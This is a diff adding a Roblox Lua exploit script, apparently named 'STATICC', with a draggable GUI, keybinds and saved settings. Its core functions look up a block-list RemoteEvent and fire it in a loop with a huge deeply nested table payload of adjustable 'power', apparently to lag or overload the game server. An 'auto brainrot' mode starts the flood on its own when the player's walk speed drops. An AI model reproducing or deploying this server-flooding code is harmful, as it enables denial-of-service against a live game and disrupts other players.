+        styleStrokes[i] = stroke(b, C.dimmer, 1, 0.5)
+        hoverStroke(b, styleStrokes[i])
+        b.MouseButton1Click:Connect(function()
+            applyTitleStyle(s.key)
+        end)
+        styleBtns[i] = b
+    end
+
+    local function findRemote()
+        local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+        if not rrs then pcall(function() rrs = game:GetService("RobloxReplicatedStorage") end) end
+        if not rrs then return nil end
+        for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList", "BlockList"}) do
+            local r = rrs:FindFirstChild(name)
+            if r and r:IsA("RemoteEvent") then return r end
+        end
+        for _, c in ipairs(rrs:GetChildren()) do
+            if c:IsA("RemoteEvent") and tostring(c.Name):find("Block") then return c end
+        end
+        return nil
+    end
+
+    local function buildPayload(power)
+        local main, nested = {}, {{}}
+        local current = nested[1]
+        for _ = 1, 186 do
+            local n = {}
+            table.insert(current, n)
+            current = n
+        end
+        local maxRep = math.min(math.floor((tonumber(power) or 70000) / 188), 10000)
+        for _ = 1, math.max(1, maxRep) do
+            table.insert(main, nested)
+        end
+        return main
+    end
+
+    local function stopLag()
+        active = false
+        if lagThread then pcall(task.cancel, lagThread); lagThread = nil end
+    end
+
+    local function runPingLoop()
+        local delay = cfg.interval
+        while active do
+            local r = remote or findRemote()
+            remote = r
+            if not r then
+                task.wait(0.3)
+                remote = findRemote()
+                if not remote then active = false; break end
+            end
+            local payload = buildPayload(cfg.power)
+            local ok = pcall(function() remote:FireServer(payload) end)
+            if not ok then
+                delay = math.min(delay * 1.4, 0.5)
+            else
+                delay = math.max(delay * 0.995, 0.05)
+            end
+            task.wait(delay)
+        end
+        lagThread = nil
+    end
+
+    local function paintAct(a)
+        if active then
+            a.lbl.Text = sp("DEACTIVATE")
+            tw(a.on, { BackgroundTransparency = 0 }, 0.24)
+            tw(a.off, { BackgroundTransparency = 1 }, 0.24)
+            tw(a.lbl, { TextColor3 = C.darkTxt }, 0.24)
+            tw(a.st, { Color = C.green, Transparency = 0, Thickness = 1.8 }, 0.2)
+        else
+            a.lbl.Text = sp("ACTIVATE")
+            tw(a.on, { BackgroundTransparency = 1 }, 0.24)
+            tw(a.off, { BackgroundTransparency = 0 }, 0.24)
+            tw(a.lbl, { TextColor3 = C.white }, 0.24)
+            tw(a.st, { Color = C.accent, Transparency = 0.3, Thickness = 1.4 }, 0.2)
+        end
+    end
+
+    local function paintActive()
+        paintAct(actMain)
+        paintAct(actCompact)
+        if active then
+            tw(mainStroke, { Color = C.green, Transparency = 0.08 }, 0.25)
+        else
+            tw(mainStroke, { Color = C.accent, Transparency = 0.3 }, 0.25)
+        end
+        powerLbl.Text = comma(cfg.power)
+    end
+
+    local function paintAuto(instant)
+        local on = cfg.autoBrainrot == true
+        local knobPos = on and UDim2.new(1, -21, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
+        if instant then
+            trackOn.BackgroundTransparency = on and 0 or 1
+            knob.Position = knobPos
+        else
+            tw(trackOn, { BackgroundTransparency = on and 0 or 1 }, 0.16)
+            tw(knob, { Position = knobPos }, 0.18, Enum.EasingStyle.Back)
+        end
+        tw(autoStroke, { Color = on and C.accent or C.dimmer, Transparency = on and 0.05 or 0.5 }, 0.16)
+    end
+
+    local function flipLag(state, isManual)
+        if isManual then
+            if brainrotMode then
+                manualOverride = not state
+            else
+                manualOverride = false
+            end
+        end
+        if state then
+            remote = remote or findRemote()
+            if not remote then
+                remote = findRemote()
+                if not remote then
+                    warn("[STATICC] Remote BlockList nao encontrado")
+                    active = false
+                    paintActive()
+                    return
+                end
+            end
+            stopLag()
+            active = true
+            lagThread = task.spawn(runPingLoop)
+        else
+            stopLag()
+        end
+        paintActive()
+        saveConfig()
+    end
+
+    actMain.btn.MouseButton1Click:Connect(function()
+        flipLag(not active, true)
+    end)
+    actCompact.btn.MouseButton1Click:Connect(function()
+        flipLag(not active, true)
+    end)
+
+    powerBox.FocusLost:Connect(function()
+        local n = tonumber(powerBox.Text)
+        if n then
+            cfg.power = math.clamp(math.floor(n + 0.5), 1, 9999999)
+            saveConfig()
+            showToast("POWER " .. comma(cfg.power))
+        end
+        powerBox.Text = tostring(cfg.power)
+        powerLbl.Text = comma(cfg.power)
+    end)
+
+    intervalBox.FocusLost:Connect(function()
+        local n = tonumber(intervalBox.Text)
+        if n then
+            cfg.interval = math.clamp(n, 0.01, 2)
+            saveConfig()
+            showToast("DELAY " .. tostring(cfg.interval) .. "S")
+        end
+        intervalBox.Text = tostring(cfg.interval)
+    end)
+
+    autoSw.MouseButton1Click:Connect(function()
+        cfg.autoBrainrot = not cfg.autoBrainrot
+        paintAuto()
+        saveConfig()
+        showToast(cfg.autoBrainrot and "AUTO BRAINROT ON" or "AUTO BRAINROT OFF")
+    end)
+
+    local pulseTwn = nil
+    local function setPulse(st, on)
+        if pulseTwn then pulseTwn:Cancel(); pulseTwn = nil end
+        if on then
+            st.Color = C.wait
+            st.Thickness = 1.6
+            pulseTwn = TweenService:Create(st, TweenInfo.new(0.45, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), { Transparency = 0.05 })
+            pulseTwn:Play()
+        else
+            st.Transparency = 0.45
+            st.Color = C.dimmer
+            st.Thickness = 1
+        end
+    end
+
+    local function updateKbLabels()
+        if listeningFor == "kb" then
+            kbBtn.Text = '<font color="#9697A0">KB:</font>  <font color="#FFCD5A">...</font>'
+        else
+            kbBtn.Text = '<font color="#9697A0">KB:</font>  ' .. (cfg.keybindKb or "-")
+        end
+        if listeningFor == "gp" then
+            gpBtn.Text = '<font color="#9697A0">GP:</font>  <font color="#FFCD5A">...</font>'
+        else
+            gpBtn.Text = '<font color="#9697A0">GP:</font>  ' .. gpShort(cfg.keybindGp)
+        end
+        setPulse(kbStroke, listeningFor == "kb")
+        setPulse(gpStroke, listeningFor == "gp")
+    end
+
+    kbBtn.MouseButton1Click:Connect(function()
+        listeningFor = (listeningFor == "kb") and nil or "kb"
+        updateKbLabels()
+    end)
+    gpBtn.MouseButton1Click:Connect(function()
+        listeningFor = (listeningFor == "gp") and nil or "gp"
+        updateKbLabels()
+    end)
+
+    local svcConns = {}
+    local function svc(conn) table.insert(svcConns, conn); return conn end
+
+    local lastBrainrotCheck = 0
+    svc(RunService.Heartbeat:Connect(function()
+        local now = os.clock()
+        if now - lastBrainrotCheck < 0.25 then return end
+        lastBrainrotCheck = now
+        if not cfg.autoBrainrot then
+            if brainrotMode then
+                brainrotMode = false
+                lastBrainrotState = false
+            end
+            return
+        end
+        local char = plr.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if not hum then return end
+        local hasBrainrot = hum.WalkSpeed > 0 and hum.WalkSpeed < 25
+        if hasBrainrot and not lastBrainrotState then
+            brainrotMode = true
+            lastBrainrotState = true
+            manualOverride = false
+            if not active then flipLag(true, false) end
+        elseif not hasBrainrot and lastBrainrotState then
+            brainrotMode = false
+            lastBrainrotState = false
+            manualOverride = false
+            if active then flipLag(false, false) end
+        end
+    end))
+
+    svc(UserInputService.InputBegan:Connect(function(input, processed)
+        local kc = input.KeyCode
+        if kc == Enum.KeyCode.Unknown then return end
+        local isGp = (function(n)
+            return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick"
+                or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
+        end)(kc.Name)
+        local isKb = input.UserInputType == Enum.UserInputType.Keyboard
+
+        if listeningFor then
+            if kc == Enum.KeyCode.Escape then
+                listeningFor = nil
+                updateKbLabels()
+                return
+            end
+            if listeningFor == "kb" and isKb and not (kc == Enum.KeyCode.LeftControl or kc == Enum.KeyCode.Unknown) then
+                cfg.keybindKb = kc.Name
+                listeningFor = nil
+                updateKbLabels()
+                saveConfig()
+                showToast("KB: " .. kc.Name)
+                return
+            end
+            if listeningFor == "gp" and isGp then
+                cfg.keybindGp = kc.Name
+                listeningFor = nil
+                updateKbLabels()
+                saveConfig()
+                showToast("GP: " .. gpShort(kc.Name))
+                return
+            end
+            return
+        end
+
+        if processed then return end
+        local kbEnum
+        local okKb, vKb = pcall(function() return Enum.KeyCode[cfg.keybindKb] end)
+        if okKb then kbEnum = vKb end
+        local gpEnum
+        local okGp, vGp = pcall(function() return Enum.KeyCode[cfg.keybindGp] end)
+        if okGp then gpEnum = vGp end
+        if (kbEnum and kc == kbEnum and isKb) or (gpEnum and kc == gpEnum and isGp) then
+            flipLag(not active, true)
+        end
+    end))
+
+    local dragging, dragStart, startPos
+    mainFrame.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = i.Position
+            startPos = mainFrame.Position
+        end
+    end)
+    svc(UserInputService.InputChanged:Connect(function(i)
+        if not dragging then return end
+        if i.UserInputType ~= Enum.UserInputType.MouseMovement and i.UserInputType ~= Enum.UserInputType.Touch then return end
+        local d = i.Position - dragStart
+        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
+    end))
+    svc(UserInputService.InputEnded:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            dragging = false
+            for b in pairs(stepHeld) do stepHeld[b] = false end
+        end
+    end))
+
+    local minimized = false
+    local function setMinimized(v)
+        minimized = v
+        if v then
+            minBtn.Text = "+"
+            actCompact.btn.Visible = true
+            body.Visible = false
+            tw(mainFrame, { Size = UDim2.new(0, MAIN_W, 0, COMPACT_H) }, 0.3, Enum.EasingStyle.Back)
+        else
+            minBtn.Text = "-"
+            actCompact.btn.Visible = false
+            body.Visible = true
+            tw(mainFrame, { Size = UDim2.new(0, MAIN_W, 0, MAIN_H) }, 0.3, Enum.EasingStyle.Back)
+        end
+    end
+
+    local function closeAll()
+        stopLag()
+        if pulseTwn then pulseTwn:Cancel(); pulseTwn = nil end
+        for _, c in ipairs(svcConns) do pcall(function() c:Disconnect() end) end
+        svcConns = {}
+        pcall(function() screen:Destroy() end)
+        _G.StaticcPingIsOpen = function() return false end
+    end
+
+    minBtn.MouseButton1Click:Connect(function()
+        setMinimized(not minimized)
+    end)
+
+    _G.StaticcPingClose = closeAll
+    _G.StaticcPingIsOpen = function()
+        return screen and screen.Parent ~= nil
+    end
+
+    setTab("main")
+    paintActive()
+    paintAuto(true)
+    updateKbLabels()
+    refreshPicker()
+    applyTitleStyle(cfg.titleStyle or "DEFAULT", true)
+    saveConfig()
+    print("[STATICC] ready")
+end
